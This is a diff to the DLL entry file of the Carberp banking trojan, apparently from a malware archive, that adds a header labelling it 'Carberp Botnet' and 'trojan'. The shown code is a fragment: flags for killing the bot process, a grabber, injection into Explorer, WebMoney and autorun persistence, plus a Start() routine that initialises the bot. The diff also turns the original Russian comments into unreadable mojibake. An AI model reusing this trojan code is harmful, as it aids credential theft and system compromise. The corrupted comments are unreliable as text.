@@ -1,4 +1,15 @@
-// dllmain.cpp: определяет точку входа для приложения DLL.
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
+// dllmain.cpp: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL.
 #include "stdafx.h"
 #include <windows.h>
 
@@ -32,7 +43,7 @@
 //#pragma comment(linker, "/ENTRY:MyDllMain" )
 
 //------------------------------------------------------------------------------
-//  Система отладочных строк
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //------------------------------------------------------------------------------
 
 #include "BotDebug.h"
@@ -50,16 +61,16 @@ namespace DLLDBGTEMPLATES
 
 //-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	
 
-WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
+WCHAR TempFileName[ MAX_PATH ]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-DWORD dwKillPid		 = 0; //пид для убийства процесса бота
-DWORD dwFirst	     = 0; //запуск в первый раз
-DWORD dwAlreadyRun   = 0; //если уже запущены
-DWORD dwGrabberRun	 = 0; //отработал ли граббер
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
+DWORD dwKillPid		 = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+DWORD dwFirst	     = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+DWORD dwAlreadyRun   = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwGrabberRun	 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwExplorerSelf = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD dwWebMoneySelf = 0;
 
-//DWORD dwExplorerPid  = 0; //пид эксплорера
+//DWORD dwExplorerPid  = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 
 
@@ -68,7 +79,7 @@ extern"C"  void WINAPI Start()
 {
 	BOT::Initialize();
 	string Msg;
-	Msg.Format("1.12 Присоедините среду к процессу [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
+	Msg.Format("1.12 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 
 
 	//pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
 	
